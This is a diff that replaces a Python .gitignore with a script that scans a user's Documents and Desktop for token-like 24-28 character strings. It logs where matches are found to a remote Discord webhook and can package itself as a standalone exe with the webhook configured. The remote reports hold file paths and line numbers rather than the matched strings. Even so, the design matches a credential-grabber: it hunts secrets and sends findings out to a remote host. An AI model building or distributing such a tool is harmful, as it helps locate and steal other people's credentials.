@@ -1,218 +1,340 @@
-# Byte-compiled / optimized / DLL files
-__pycache__/
-*.py[codz]
-*$py.class
+import os
+import re
+import random
+import time
+import string
+import subprocess
+import sys
+import logging
+import json
+from datetime import datetime
+from urllib.request import Request, urlopen
+from urllib.error import URLError, HTTPError
 
-# C extensions
-*.so
+# --- CONFIGURATION ---
+DIRECTORIES_TO_SEARCH = [
+    r"%userprofile%\Documents",
+    r"%userprofile%\Desktop"
+]
 
-# Distribution / packaging
-.Python
-build/
-develop-eggs/
-dist/
-downloads/
-eggs/
-.eggs/
-lib/
-lib64/
-parts/
-sdist/
-var/
-wheels/
-share/python-wheels/
-*.egg-info/
-.installed.cfg
-*.egg
-MANIFEST
+VALID_EXTENSIONS = ('.txt', '.log', '.csv', '.json', '.md')
+REGEX_PATTERN = r"\b[a-zA-Z0-9]{24,28}\b"
+LOG_FILE_NAME = "scanner_audit.log"
+CONFIG_FILE_NAME = "config.json"
+# ---------------------
 
-# PyInstaller
-#   Usually these files are written by a python script from a template
-#   before PyInstaller builds the exe, so as to inject date/other infos into it.
-*.manifest
-*.spec
 
-# Installer logs
-pip-log.txt
-pip-delete-this-directory.txt
+class DiscordWebhookHandler(logging.Handler):
+    """Custom logging handler to route log statements to a Discord channel via Webhooks."""
+    def __init__(self, webhook_url):
+        super().__init__()
+        self.webhook_url = webhook_url
 
-# Unit test / coverage reports
-htmlcov/
-.tox/
-.nox/
-.coverage
-.coverage.*
-.cache
-nosetests.xml
-coverage.xml
-*.cover
-*.py.cover
-.hypothesis/
-.pytest_cache/
-cover/
+    def emit(self, record):
+        if not self.webhook_url:
+            return  # Skip if URL is not configured
 
-# Translations
-*.mo
-*.pot
+        log_entry = self.format(record)
+        
+        # Color-code based on severity level
+        if record.levelno >= logging.ERROR:
+            color = 15158332  # Red
+        elif record.levelno >= logging.WARNING:
+            color = 15105570  # Orange
+        else:
+            color = 3447003   # Blue
 
-# Django stuff:
-*.log
-local_settings.py
-db.sqlite3
-db.sqlite3-journal
+        # Fixed the unterminated f-string by using triple double-quotes
+        payload = {
+            "embeds": [
+                {
+                    "title": f"System Log - {record.levelname}",
+                    "description": f"""```txt\n{log_entry}\n```""",
+                    "color": color,
+                    "timestamp": datetime.utcfromtimestamp(record.created).isoformat() + "Z"
+                }
+            ]
+        }
 
-# Flask stuff:
-instance/
-.webassets-cache
+        try:
+            req = Request(
+                self.webhook_url,
+                data=json.dumps(payload).encode('utf-8'),
+                headers={
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+                },
+                method='POST'
+            )
+            with urlopen(req, timeout=5):
+                pass
+        except (URLError, HTTPError):
+            pass
 
-# Scrapy stuff:
-.scrapy
 
-# Sphinx documentation
-docs/_build/
+def load_webhook_url():
+    """Attempts to dynamically read the webhook token from an external config file."""
+    if os.path.exists(CONFIG_FILE_NAME):
+        try:
+            with open(CONFIG_FILE_NAME, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+                return data.get("discord_webhook_url", "").strip()
+        except Exception:
+            pass
+    return ""
 
-# PyBuilder
-.pybuilder/
-target/
 
-# Jupyter Notebook
-.ipynb_checkpoints
+# --- LOGGER INITIALIZATION ---
+logger = logging.getLogger()
+logger.setLevel(logging.INFO)
+log_formatter = logging.Formatter('%(asctime)s - [%(levelname)s] - %(message)s')
 
-# IPython
-profile_default/
-ipython_config.py
+# 1. Local File Logging Handler
+file_handler = logging.FileHandler(LOG_FILE_NAME, mode='a', encoding='utf-8')
+file_handler.setFormatter(log_formatter)
+logger.addHandler(file_handler)
 
-# pyenv
-#   For a library or package, you might want to ignore these files since the code is
-#   intended to run in multiple environments; otherwise, check them in:
-# .python-version
+# 2. Dynamic Discord Webhook Logging Handler
+webhook_url = load_webhook_url()
+if webhook_url:
+    discord_handler = DiscordWebhookHandler(webhook_url)
+    discord_handler.setFormatter(log_formatter)
+    logger.addHandler(discord_handler)
+else:
+    print("[!] Notice: No external 'config.json' discovered. Logging exclusively to local text file.")
+# -----------------------------
 
-# pipenv
-#   According to pypa/pipenv#598, it is recommended to include Pipfile.lock in version control.
-#   However, in case of collaboration, if having platform-specific dependencies or dependencies
-#   having no cross-platform support, pipenv may install dependencies that don't work, or not
-#   install all needed dependencies.
-# Pipfile.lock
 
-# UV
-#   Similar to Pipfile.lock, it is generally recommended to include uv.lock in version control.
-#   This is especially recommended for binary packages to ensure reproducibility, and is more
-#   commonly ignored for libraries.
-# uv.lock
+def generate_random_alphanumeric_string(length):
+    """Generates a continuous string composed purely of mixed-case letters and digits."""
+    characters = string.ascii_letters + string.digits
+    return "".join(random.choice(characters) for _ in range(length))
 
-# poetry
-#   Similar to Pipfile.lock, it is generally recommended to include poetry.lock in version control.
-#   This is especially recommended for binary packages to ensure reproducibility, and is more
-#   commonly ignored for libraries.
-#   https://python-poetry.org/docs/basic-usage/#commit-your-poetrylock-file-to-version-control
-# poetry.lock
-# poetry.toml
 
-# pdm
-#   Similar to Pipfile.lock, it is generally recommended to include pdm.lock in version control.
-#   pdm recommends including project-wide configuration in pdm.toml, but excluding .pdm-python.
-#   https://pdm-project.org/en/latest/usage/project/#working-with-version-control
-# pdm.lock
-# pdm.toml
-.pdm-python
-.pdm-build/
+def run_test_environment():
+    """
+    [FEATURE 1] TEST MODE
+    Generates 50 complex alphanumeric noise lines and exactly 1 hidden target line
+    """
+    logging.info("Starting routine: TEST MODE simulation environment.")
+    test_filename = "regex_complex_test_sandbox.txt"
+    print(f"\n[~] Launching Test Mode: Generating '{test_filename}' with alphanumeric noise...")
+    
+    prefixes = ["ERR_LOG", "SYS_STATE", "AUTH_DEBUG", "PACKET_DUMP", "METRIC_v2"]
+    operations = ["fetch_session", "handshake_init", "callback_payload", "db_commit_failure"]
+    statuses = ["STATUS=404", "FLAGS=0x7F", "RESULT=TERMINATED", "RETRY_COUNT=3"]
 
-# pixi
-#   Similar to Pipfile.lock, it is generally recommended to include pixi.lock in version control.
-# pixi.lock
-#   Pixi creates a virtual environment in the .pixi directory, just like venv module creates one
-#   in the .venv directory. It is recommended not to include this directory in version control.
-.pixi
+    lines_pool = []
 
-# PEP 582; used by e.g. github.com/David-OConnor/pyflow and github.com/pdm-project/pdm
-__pypackages__/
+    for i in range(50):
+        prefix = random.choice(prefixes)
+        op = random.choice(operations)
+        stat = random.choice(statuses)
+        
+        random_hash_1 = generate_random_alphanumeric_string(random.randint(6, 12))
+        random_hash_2 = generate_random_alphanumeric_string(random.randint(8, 16))
+        
+        if i % 2 == 0:
+            invalid_digits = "".join(str(random.randint(0, 9)) for _ in range(random.randint(5, 12)))
+        else:
+            invalid_digits = "".join(str(random.randint(0, 9)) for _ in range(random.randint(35, 45)))
+            
+        simulated_line = f"<{random_hash_1}> {prefix}::{op} [{stat}] - StringData: \"{random_hash_2}\" ID:{invalid_digits}"
+        lines_pool.append(simulated_line)
 
-# Celery stuff
-celerybeat-schedule
-celerybeat.pid
+    simulated_token = generate_random_alphanumeric_string(26)
+    target_line_index = random.randint(0, 49)
+    lines_pool.insert(target_line_index, f"authorization_callback verified secure identifier payload: {simulated_token}")
 
-# Redis
-*.rdb
-*.aof
-*.pid
+    summary_line_number = 0
+    summary_line_content = ""
+    summary_extracted_code = ""
 
-# RabbitMQ
-mnesia/
-rabbitmq/
-rabbitmq-data/
+    try:
+        with open(test_filename, 'w', encoding='utf-8') as f:
+            f.write("\n".join(lines_pool))
+        
+        print(f"[+] Sandbox file written. Beginning step-by-step terminal evaluation stream (0.5s intervals)...\n")
+        print("=" * 95)
+        print(f" {'LINE':<8} | {'STREAMING SENTENCE CONTENT AND EVALUATION STATUS'}")
+        print("=" * 95)
+        
+        target_pattern = re.compile(REGEX_PATTERN)
+        
+        with open(test_filename, 'r', encoding='utf-8') as f:
+            for line_num, line in enumerate(f, 1):
+                clean_line = line.strip()
+                matches = target_pattern.findall(clean_line)
+                
+                if matches:
+                    for match in matches:
+                        summary_line_number = line_num
+                        summary_line_content = clean_line
+                        summary_extracted_code = match
+                        
+                        print(f" Line {line_num:02d} | [ FOUND TARGET MATCH ]")
+                        print(f"          └─> Content: \"{clean_line}\"")
+                        print(f"          └─> Extracted Code ({len(match)} chars): {match}")
+                        print("-" * 95)
+                else:
+                    print(f" Line {line_num:02d} | [ SCANNING ] Passed: \"{clean_line}\"")
+                
+                time.sleep(0.5)
+                    
+        print("=" * 95)
+        print(f"[~] Test complete. Evaluated 51 lines total.")
+        print("-" * 95)
+        print(">>> DETAILED DISCOVERY SUMMARY REPORT <<<")
+        print(f"  • Located On Line   : {summary_line_number}")
+        print(f"  • Extracted Code    : {summary_extracted_code}")
+        print("-" * 95)
+        
+        os.remove(test_filename)
+        
+        logging.info(f"TEST MODE completed. Match found successfully on simulated line {summary_line_number}. Isolated data string length: {len(summary_extracted_code)}")
+        print(f"[+] Operations updated successfully.")
+        
+    except Exception as e:
+        error_msg = f"Error executing test mode sandbox: {e}"
+        logging.error(error_msg)
+        print(f"[!] {error_msg}")
 
-# ActiveMQ
-activemq-data/
 
-# SageMath parsed files
-*.sage.py
+def scan_for_numeric_patterns():
+    """
+    [FEATURE 2] LIVE SCANNED ENVIRONMENT RUN
+    Crawls local storage directories, logs matches and files scanned locally.
+    """
+    logging.info("Starting routine: LIVE SCAN operations initiated.")
+    target_pattern = re.compile(REGEX_PATTERN)
+    match_counter = 0
+    files_scanned_count = 0
 
-# Environments
-.env
-.envrc
-.venv
-env/
-venv/
-ENV/
-env.bak/
-venv.bak/
+    print("\nInitializing Live Multi-Directory Structural Scan...")
+    print("=" * 70)
 
-# Spyder project settings
-.spyderproject
-.spyproject
+    for raw_path in DIRECTORIES_TO_SEARCH:
+        absolute_directory = os.path.expandvars(raw_path)
 
-# Rope project settings
-.ropeproject
+        if not os.path.exists(absolute_directory):
+            logging.warning(f"Scan path target missing or unavailable: '{absolute_directory}'")
+            print(f"\n[!] Skipping Folder: '{absolute_directory}' (Path not found)")
+            continue
 
-# mkdocs documentation
-/site
+        print(f"\n[+] Entering Folder Tree: {absolute_directory}")
+        print("-" * 70)
 
-# mypy
-.mypy_cache/
-.dmypy.json
-dmypy.json
+        for root, _, files in os.walk(absolute_directory):
+            for file_name in files:
+                file_path = os.path.join(root, file_name)
+                
+                if file_name.lower().endswith(VALID_EXTENSIONS):
+                    files_scanned_count += 1
+                    
+                    try:
+                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as active_file:
+                            for line_number, line in enumerate(active_file, 1):
+                                discovered_matches = target_pattern.findall(line)
+                                for code in discovered_matches:
+                                    match_counter += 1
+                                    print(f"\n[*] MATCH #{match_counter:03d} DISCOVERED!")
+                                    print(f"    Location: {file_path}")
+                                    print(f"    Line No : {line_number}")
+                                    
+                                    logging.info(f"MATCH DISCOVERED: File='{file_path}' Line={line_number}")
+                    except (PermissionError, FileNotFoundError):
+                        logging.warning(f"Read failure or access denied on local file: '{file_path}'")
+                        continue
 
-# Pyre type checker
-.pyre/
+    print("\n" + "=" * 70)
+    print(f"Live Scan Phase Complete. Found and displayed {match_counter} total match(es).")
+    
+    logging.info(f"LIVE SCAN finished. Total files inspected: {files_scanned_count}. Total distinct pattern matches recorded: {match_counter}.")
+    print(f"[+] Operational audit saved and logged successfully.")
 
-# pytype static type analyzer
-.pytype/
 
-# Cython debug symbols
-cython_debug/
+def build_self_into_executable():
+    """
+    [FEATURE 3] COMPILATION AUTOMATION
+    Prompts user for the sensitive webhook URL configuration directly in the terminal,
+    saves it to a distribution configuration file, and builds the standalone binary.
+    """
+    logging.info("Starting routine: EXECUTABLE COMPILATION requested.")
+    print("\n=== COMPILATION MANAGER ===")
+    desired_name = input("Enter the target name for the output executable (e.g., DataScanner): ").strip()
+    
+    if not desired_name:
+        print("[!] Execution aborted: valid name string missing.")
+        logging.warning("Compilation canceled: user provided an empty string filename input.")
+        return
 
-# PyCharm
-#   JetBrains specific template is maintained in a separate JetBrains.gitignore that can
-#   be found at https://github.com/github/gitignore/blob/main/Global/JetBrains.gitignore
-#   and can be added to the global gitignore or merged into this file.  For a more nuclear
-#   option (not recommended) you can uncomment the following to ignore the entire idea folder.
-# .idea/
+    # Clean the input filename string
+    desired_name = os.path.splitext(desired_name)[0]
+    desired_name = "".join(c for c in desired_name if c.isalnum() or c in ('_', '-'))
 
-# Abstra
-#   Abstra is an AI-powered process automation framework.
-#   Ignore directories containing user credentials, local state, and settings.
-#   Learn more at https://abstra.io/docs
-.abstra/
+    # SECURE TERMINAL PROMPT FOR WEBHOOK TOKEN/URL
+    print("\n--- REMOTE WEBHOOK PROMPT ---")
+    webhook_input = input("Paste your Discord Webhook URL (Leave empty to skip remote logging): ").strip()
 
-# Visual Studio Code
-#   Visual Studio Code specific template is maintained in a separate VisualStudioCode.gitignore 
-#   that can be found at https://github.com/github/gitignore/blob/main/Global/VisualStudioCode.gitignore
-#   and can be added to the global gitignore or merged into this file. However, if you prefer, 
-#   you could uncomment the following to ignore the entire vscode folder
-# .vscode/
-# Temporary file for partial code execution
-tempCodeRunnerFile.py
+    current_script_path = os.path.abspath(__file__)
+    dist_folder = os.path.join(os.path.dirname(current_script_path), "dist")
+    
+    print(f"\n[1] Current source targeted: {current_script_path}")
+    print(f"[2] Invoking compiler settings for single binary package configuration...")
+    
+    command = [
+        sys.executable, "-m", "PyInstaller",
+        "--onefile",
+        "--name", desired_name,
+        current_script_path
+    ]
+    
+    try:
+        result = subprocess.run(command, capture_output=False, text=True)
+        
+        if result.returncode == 0:
+            # If the user supplied a webhook token, build out their config package directly inside the output \dist\ folder
+            if webhook_input:
+                os.makedirs(dist_folder, exist_ok=True)
+                target_config_path = os.path.join(dist_folder, CONFIG_FILE_NAME)
+                
+                with open(target_config_path, 'w', encoding='utf-8') as cfg_file:
+                    json.dump({"discord_webhook_url": webhook_input}, cfg_file, indent=4)
+                
+                print(f"[+] Security Profile Generated: Configured dynamic hook mapping saved into distribution folder.")
 
-# Ruff stuff:
-.ruff_cache/
+            logging.info(f"COMPILATION SUCCESSFUL. Standalone binary created named: '{desired_name}.exe'")
+            print(f"\n[+] Production Completed successfully!")
+            print(f"[+] Navigate to the '\\dist\\' folder to find '{desired_name}.exe' and its corresponding '{CONFIG_FILE_NAME}'.")
+            print("[!] Note: To ensure remote logging works, keep the 'config.json' file in the same directory as the '.exe'.")
+        else:
+            logging.error(f"COMPILATION FAILED. PyInstaller returned error code: {result.returncode}")
+            print("\n[!] PyInstaller encountered a structural failure during translation processing.")
+    except Exception as e:
+        logging.error(f"Critical exception thrown during build sequence: {e}")
+        print(f"[!] Compilation engine threw a critical handler error: {e}")
 
-# PyPI configuration file
-.pypirc
 
-# Marimo
-marimo/_static/
-marimo/_lsp/
-__marimo__/
+if __name__ == "__main__":
+    print("=========================================")
+    print("     PATTERN EXPLORER SYSTEM TERMINAL     ")
+    print("=========================================")
+    print(" Available Engine Routines:")
+    print("  [test]  - Sandbox simulator (50 dummy lines vs. 1 valid code)")
+    print("  [run]   - Real multi-directory live scanner scan")
+    print("  [build] - Compile this complete program setup into a custom standalone EXE")
+    print("=========================================")
+    
+    user_choice = input("Select a function routine (test/run/build): ").strip().lower()
 
-# Streamlit
-.streamlit/secrets.toml
+    if user_choice == "test":
+        run_test_environment()
+    elif user_choice == "run":
+        scan_for_numeric_patterns()
+    elif user_choice == "build":
+        build_self_into_executable()
+    else:
+        print("[!] Mode choice not recognized. Exiting application layer.")
+        logging.warning(f"Application terminated: Invalid startup command input offered: '{user_choice}'")
+        
+    input("\nExecution sequence finished. Press Enter to close process...")
